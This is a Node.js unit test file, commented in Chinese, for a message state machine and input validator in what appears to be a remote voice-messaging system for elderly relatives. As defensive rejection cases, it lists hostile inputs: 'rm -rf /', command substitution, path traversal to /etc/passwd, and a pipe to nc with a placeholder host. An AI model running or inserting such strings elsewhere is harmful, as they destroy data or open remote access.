'use strict';

/**
 * comms-core.test.js — 远程交流消息的状态机、校验与预置语音映射单元测试
 *
 * 这些都是**先于实现编写**的失败测试，用来锁定第一阶段的行为边界：
 *   - 状态只能按合法方向迁移，终态不可回退；
 *   - 重复回报同一状态幂等，非法回退被拒绝；
 *   - 未领取的消息不能被 ACKED；
 *   - voiceId 只能来自服务端允许列表，路径/命令/URL 一律拒绝；
 *   - 不允许客户端提交身份、令牌、手机号或坐标。
 *
 * 不访问真实微信、OneNET、串口或公网。
 */

const test = require('node:test');
const assert = require('node:assert/strict');

const {
  MESSAGE_STATES,
  TERMINAL_STATES,
  EVENT_TO_STATE,
  canTransition,
  applyEvent,
  deriveStatus,
  MESSAGE_ID_RE,
  CLIENT_MESSAGE_ID_RE,
  MESSAGE_TEXT_MAX,
  VOICE_IDS,
  VOICE_MAP,
  resolveVoice,
  validateComposeInput,
  createMessageId,
  publicMessage,
  LEASE_MS,
  DEFAULT_MESSAGE_CAP,
  MESSAGE_TTL_MS
} = require('../src/comms-core');

/* ------------------------------------------------------------ 状态机 */

test('the six documented states exist and three of them are terminal', () => {
  assert.deepEqual([...MESSAGE_STATES].sort(), ['ACKED', 'DELIVERED', 'EXPIRED', 'FAILED', 'PLAYED', 'QUEUED']);
  assert.deepEqual([...TERMINAL_STATES].sort(), ['ACKED', 'EXPIRED', 'FAILED']);
});

test('legal forward transitions are allowed', () => {
  assert.equal(canTransition('QUEUED', 'DELIVERED'), true);
  assert.equal(canTransition('QUEUED', 'FAILED'), true);
  assert.equal(canTransition('QUEUED', 'EXPIRED'), true);
  assert.equal(canTransition('DELIVERED', 'PLAYED'), true);
  assert.equal(canTransition('DELIVERED', 'FAILED'), true);
  assert.equal(canTransition('DELIVERED', 'EXPIRED'), true);
  assert.equal(canTransition('PLAYED', 'ACKED'), true);
  assert.equal(canTransition('PLAYED', 'FAILED'), true);
});

test('terminal states never move again', () => {
  for (const state of TERMINAL_STATES) {
    for (const next of MESSAGE_STATES) {
      assert.equal(canTransition(state, next), false, `${state} must not move to ${next}`);
    }
  }
});

test('illegal regression and skipping are rejected', () => {
  assert.equal(canTransition('ACKED', 'QUEUED'), false, 'ACKED 不得回退到 QUEUED');
  assert.equal(canTransition('FAILED', 'PLAYED'), false, 'FAILED 不得变成 PLAYED');
  assert.equal(canTransition('QUEUED', 'PLAYED'), false, '未领取不得直接 PLAYED');
  assert.equal(canTransition('QUEUED', 'ACKED'), false, '未领取不得直接 ACKED');
  assert.equal(canTransition('DELIVERED', 'ACKED'), false, '未播放不得直接 ACKED');
  assert.equal(canTransition('EXPIRED', 'DELIVERED'), false);
  assert.equal(canTransition('NOPE', 'QUEUED'), false, '未知状态一律拒绝');
});

test('repeating the current state is idempotent, not a transition', () => {
  assert.equal(canTransition('DELIVERED', 'DELIVERED'), false, '同状态重复回报不算迁移');
  assert.equal(canTransition('PLAYED', 'PLAYED'), false);
  const message = { status: 'PLAYED', failureCode: '' };
  const result = applyEvent(message, 'PLAYED', 1000);
  assert.equal(result.changed, false, '重复 PLAYED 必须幂等');
  assert.equal(result.message.status, 'PLAYED');
});

test('applyEvent moves the state and stamps the right timestamp', () => {
  const queued = {
    status: 'QUEUED', createdAt: 1, updatedAt: 1,
    leaseId: 'lease-a', leaseExpiresAt: 1000
  };
  const delivered = applyEvent(queued, 'DELIVERED', 100, { leaseId: 'lease-a' });
  assert.equal(delivered.changed, true);
  assert.equal(delivered.message.status, 'DELIVERED');
  assert.equal(delivered.message.deliveredAt, 100);
  assert.equal(delivered.message.updatedAt, 100);
  assert.equal(delivered.message.leaseId, 'lease-a', 'DELIVERED 必须保留租约直到播放结果落盘');

  const played = applyEvent(delivered.message, 'PLAYED', 200);
  assert.equal(played.message.status, 'PLAYED');
  assert.equal(played.message.playedAt, 200);
  assert.equal(played.message.deliveredAt, 100, '前一个时间戳必须保留');
  assert.equal(played.message.leaseId, '', 'PLAYED 后才释放播放租约');

  const acked = applyEvent(played.message, 'ACKED', 300);
  assert.equal(acked.message.status, 'ACKED');
  assert.equal(acked.message.acknowledgedAt, 300);
});

test('the server-only EXPIRED event is a real persisted transition', () => {
  const queued = { status: 'QUEUED', leaseId: 'lease-a', leaseExpiresAt: 1000 };
  const expired = applyEvent(queued, 'EXPIRED', 2000);
  assert.equal(expired.changed, true);
  assert.equal(expired.rejected, false);
  assert.equal(expired.message.status, 'EXPIRED');
  assert.equal(expired.message.expiredAt, 2000);
  assert.equal(expired.message.leaseId, '');
});

test('applyEvent refuses illegal transitions and records nothing', () => {
  const acked = { status: 'ACKED', acknowledgedAt: 300, updatedAt: 300 };
  const attempt = applyEvent(acked, 'DELIVERED', 400);
  assert.equal(attempt.changed, false);
  assert.equal(attempt.rejected, true);
  assert.equal(attempt.message.status, 'ACKED', '被拒绝的迁移不得改变状态');

  const queued = { status: 'QUEUED' };
  const skip = applyEvent(queued, 'ACKED', 1);
  assert.equal(skip.rejected, true);
  assert.equal(skip.message.status, 'QUEUED');
});

test('FAILED carries a bounded failure code only', () => {
  const queued = { status: 'QUEUED' };
  const failed = applyEvent(queued, 'FAILED', 50, { failureCode: 'AUDIO_ROUTE_MISSING' });
  assert.equal(failed.message.status, 'FAILED');
  assert.equal(failed.message.failureCode, 'AUDIO_ROUTE_MISSING');

  const bad = applyEvent(queued, 'FAILED', 50, { failureCode: 'lower case!' });
  assert.equal(bad.rejected, true, '非法 failureCode 必须被拒绝');
});

test('EXPIRED can be derived from the deadline without a device report', () => {
  const message = { status: 'QUEUED', expiresAt: 1000 };
  assert.equal(deriveStatus(message, 999), 'QUEUED');
  assert.equal(deriveStatus(message, 1000), 'EXPIRED');
  assert.equal(deriveStatus({ status: 'ACKED', expiresAt: 1000 }, 5000), 'ACKED', '终态不因过期改变');
  assert.equal(deriveStatus({ status: 'DELIVERED', expiresAt: 1000 }, 2000), 'EXPIRED');
});

/* ------------------------------------------------------------ 预置语音映射 */

test('the voice allowlist is fixed and mapped to fixed resources', () => {
  assert.deepEqual([...VOICE_IDS].sort(), [
    'CHECK_IN', 'EMERGENCY_CONTACTING', 'FAMILY_MESSAGE', 'MEDICINE_REMINDER', 'PLEASE_RESPOND'
  ]);
  assert.equal(Object.isFrozen(VOICE_MAP), true);
  for (const id of VOICE_IDS) {
    const entry = VOICE_MAP[id];
    assert.ok(entry, `${id} must be mapped`);
    assert.match(entry.resource, /^[a-z0-9_]+\.(wav|m4a|mp3|aac|ogg)$/, `${id} resource must be a plain file name`);
    assert.equal(entry.resource.includes('/'), false, `${id} resource must not contain a path`);
    assert.equal(entry.resource.includes('..'), false);
    assert.equal(typeof entry.label, 'string');
    assert.equal(typeof entry.spokenText, 'string');
    assert.ok(entry.spokenText.length > 0 && entry.spokenText.length <= MESSAGE_TEXT_MAX);
  }
});

test('resolveVoice accepts only exact allowlist ids and returns a fixed resource', () => {
  assert.deepEqual(resolveVoice('CHECK_IN'), { voiceId: 'CHECK_IN', resource: VOICE_MAP.CHECK_IN.resource, label: VOICE_MAP.CHECK_IN.label });
  assert.equal(resolveVoice('check_in'), null, '大小写不匹配必须拒绝');
  assert.equal(resolveVoice(''), null);
  assert.equal(resolveVoice(null), null);
  assert.equal(resolveVoice(123), null);
  assert.equal(resolveVoice('../../etc/passwd'), null);
  assert.equal(resolveVoice('/etc/passwd'), null);
  assert.equal(resolveVoice('CHECK_IN; rm -rf /'), null);
  assert.equal(resolveVoice('CHECK_IN$(id)'), null);
  assert.equal(resolveVoice('CHECK_IN`id`'), null);
  assert.equal(resolveVoice('CHECK_IN && reboot'), null);
  assert.equal(resolveVoice('CHECK_IN\nPLEASE_RESPOND'), null);
  assert.equal(resolveVoice('UNKNOWN_VOICE'), null);
  assert.equal(resolveVoice('a'.repeat(200)), null);
});

/* ------------------------------------------------------------ 输入校验 */

const goodInput = {
  clientMessageId: 'cmsg-abc12345',
  deviceId: 'dayu200-room-1',
  text: '妈妈，记得吃药',
  voiceId: 'MEDICINE_REMINDER',
  requestAck: true
};

test('a well-formed compose payload passes validation', () => {
  const result = validateComposeInput(goodInput);
  assert.equal(result.ok, true, JSON.stringify(result.errors));
  assert.deepEqual(result.errors, {});
  assert.equal(result.value.text, '妈妈，记得吃药');
  assert.equal(result.value.requestAck, true);
  assert.equal(result.value.voiceId, 'MEDICINE_REMINDER');
});

test('clientMessageId format and length are enforced', () => {
  for (const bad of ['', 'short', 'has space here', 'has/slash12', 'has..dots12', 'a'.repeat(65), 'bad$id12345', null, 42]) {
    const result = validateComposeInput({ ...goodInput, clientMessageId: bad });
    assert.equal(result.ok, false, `clientMessageId=${JSON.stringify(bad)} must be rejected`);
    assert.ok(result.errors.clientMessageId, 'must report which field failed');
  }
  assert.equal(validateComposeInput({ ...goodInput, clientMessageId: 'a'.repeat(64) }).ok, true);
  assert.equal(CLIENT_MESSAGE_ID_RE.test('cmsg-abc12345'), true);
});

test('deviceId format is enforced', () => {
  for (const bad of ['', 'bad device', '../escape', 'a'.repeat(65), 'dev/1', null]) {
    const result = validateComposeInput({ ...goodInput, deviceId: bad });
    assert.equal(result.ok, false, `deviceId=${JSON.stringify(bad)} must be rejected`);
    assert.ok(result.errors.deviceId);
  }
});

test('text is trimmed, bounded, and rejects control characters', () => {
  assert.equal(validateComposeInput({ ...goodInput, text: '  你好  ' }).value.text, '你好');
  assert.equal(MESSAGE_TEXT_MAX, 120);
  assert.equal(validateComposeInput({ ...goodInput, text: 'x'.repeat(120) }).ok, true);
  assert.equal(validateComposeInput({ ...goodInput, text: 'x'.repeat(121) }).ok, false);
  assert.equal(validateComposeInput({ ...goodInput, text: '' }).ok, false);
  assert.equal(validateComposeInput({ ...goodInput, text: '   ' }).ok, false);
  assert.equal(validateComposeInput({ ...goodInput, text: 'a\u0000b' }).ok, false, 'NUL 必须拒绝');
  assert.equal(validateComposeInput({ ...goodInput, text: 'a\r\nb' }).ok, false, 'CR/LF 必须拒绝');
  assert.equal(validateComposeInput({ ...goodInput, text: null }).ok, false);
});

test('text may not carry URLs, paths, shell metacharacters or secrets', () => {
  const hostile = [
    'http://evil.example/x',
    'https://evil.example',
    'file:///etc/passwd',
    '/etc/passwd',
    '../../etc/passwd',
    'C:\\Windows\\system32',
    'hello; rm -rf /',
    'hello && reboot',
    'hello | nc evil 1234',
    '$(id)',
    '`id`',
    'a > /tmp/x',
    'a < /tmp/x',
    'openid=oABC123456789012345678',
    'access_token=abcdef1234567890',
    'appsecret=deadbeefdeadbeef',
    'phone 13800001111',
    '位置 39.9042000,116.4074000'
  ];
  for (const text of hostile) {
    const result = validateComposeInput({ ...goodInput, text });
    assert.equal(result.ok, false, `text=${JSON.stringify(text)} must be rejected`);
    assert.ok(result.errors.text, 'must report the text field');
  }
  // 正常中文与常见标点仍然可用。
  for (const text of ['妈妈，记得吃药。', '我在外面，晚点回来（18:30）', '记得喝水！', '血压药 1 片 + 2 片']) {
    assert.equal(validateComposeInput({ ...goodInput, text }).ok, true, `${text} should be allowed`);
  }
});

test('client-supplied identity and secret fields are rejected outright', () => {
  for (const key of ['openid', 'unionid', 'recipientRef', 'token', 'accessToken', 'phone', 'latitude', 'longitude', 'household', 'owner']) {
    const result = validateComposeInput({ ...goodInput, [key]: 'whatever' });
    assert.equal(result.ok, false, `字段 ${key} 必须被拒绝`);
    assert.ok(result.errors[key], `must report ${key}`);
  }
});

test('non-boolean requestAck is rejected', () => {
  assert.equal(validateComposeInput({ ...goodInput, requestAck: 'yes' }).ok, false);
  assert.equal(validateComposeInput({ ...goodInput, requestAck: 1 }).ok, false);
  assert.equal(validateComposeInput({ ...goodInput, requestAck: undefined }).ok, false);
  assert.equal(validateComposeInput({ ...goodInput, requestAck: false }).ok, true);
});

test('a non-object payload is rejected without throwing', () => {
  for (const bad of [null, undefined, 42, 'str', []]) {
    const result = validateComposeInput(bad);
    assert.equal(result.ok, false);
  }
});

test('validateComposeInput never echoes secret values back', () => {
  const result = validateComposeInput({ ...goodInput, openid: 'oSECRET123456789012345678' });
  assert.equal(JSON.stringify(result).includes('oSECRET123456789012345678'), false, '校验结果不得回显敏感值');
});

/* ------------------------------------------------------------ 消息 ID 与公开形状 */

test('message ids are prefixed, bounded and unique', () => {
  const ids = new Set();
  for (let index = 0; index < 200; index += 1) ids.add(createMessageId(1_700_000_000_000 + index));
  assert.equal(ids.size, 200, 'ID 必须唯一');
  for (const id of ids) {
    assert.match(id, MESSAGE_ID_RE);
    assert.equal(id.length <= 64, true);
  }
});

test('publicMessage exposes only the agreed fields and never a secret', () => {
  const stored = {
    messageId: 'cmsg-abc12345',
    ownerRef: 'r1_some-internal-owner-ref-value-000000000000',
    deviceId: 'dayu200-room-1',
    text: '记得吃药',
    voiceId: 'MEDICINE_REMINDER',
    requestAck: true,
    status: 'QUEUED',
    createdAt: 1, updatedAt: 2, deliveredAt: 0, playedAt: 0, acknowledgedAt: 0,
    expiresAt: 3, failureCode: '', attempts: 0,
    leaseId: 'lease-secret-value', leaseExpiresAt: 4,
    openid: 'oSHOULD-NOT-LEAK1234567890'
  };
  const pub = publicMessage(stored);
  assert.deepEqual(Object.keys(pub).sort(), [
    'acknowledgedAt', 'createdAt', 'deliveredAt', 'deviceId', 'expiresAt', 'failureCode',
    'messageId', 'playedAt', 'requestAck', 'status', 'text', 'updatedAt', 'voiceId'
  ]);
  const text = JSON.stringify(pub);
  assert.equal(text.includes('openid'), false);
  assert.equal(text.includes('oSECRET'), false);
  assert.equal(text.includes('oSECRET'), false);
  assert.equal(text.includes('leaseId'), false, '租约标识不得公开');
  assert.equal(text.includes('ownerRef'), false, '内部身份引用不得公开');
  assert.equal(text.includes('r1_'), false);
});

/* ------------------------------------------------------------ 常量 */

test('lease, TTL and capacity constants are sane', () => {
  assert.equal(LEASE_MS > 0 && LEASE_MS <= 5 * 60 * 1000, true, '租约必须在 5 分钟内');
  assert.equal(MESSAGE_TTL_MS >= 60 * 1000, true, '消息 TTL 至少 1 分钟');
  assert.equal(DEFAULT_MESSAGE_CAP >= 50, true, '容量上限必须允许足够的近期消息');
  assert.equal(EVENT_TO_STATE.DELIVERED, 'DELIVERED');
  assert.equal(EVENT_TO_STATE.PLAYED, 'PLAYED');
  assert.equal(EVENT_TO_STATE.ACKED, 'ACKED');
  assert.equal(EVENT_TO_STATE.FAILED, 'FAILED');
});
